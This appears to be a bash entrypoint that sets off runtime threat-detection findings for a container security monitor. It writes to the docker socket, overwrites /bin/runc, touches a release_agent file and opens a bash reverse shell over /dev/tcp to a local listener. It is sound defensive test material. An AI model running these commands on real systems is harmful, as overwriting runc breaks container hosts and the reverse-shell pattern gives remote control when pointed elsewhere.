#!/bin/bash

#PrivilegeEscalation:Runtime/DockerSocketAccessed
bash -c 'nc -lU /var/run/docker.sock &'
echo SocketAccessed | nc -w5 -U /var/run/docker.sock


#PrivilegeEscalation:Runtime/RuncContainerEscape
touch /bin/runc
echo "Runc Container Escape" > /bin/runc

#PrivilegeEscalation:Runtime/CGroupsReleaseAgentModified
touch /tmp/release_agent
echo "Release Agent Modified" > /tmp/release_agent

#Execution:Runtime/ReverseShell
timeout 5s nc -nlp 1337 &
sleep 1
bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'

exec "$@"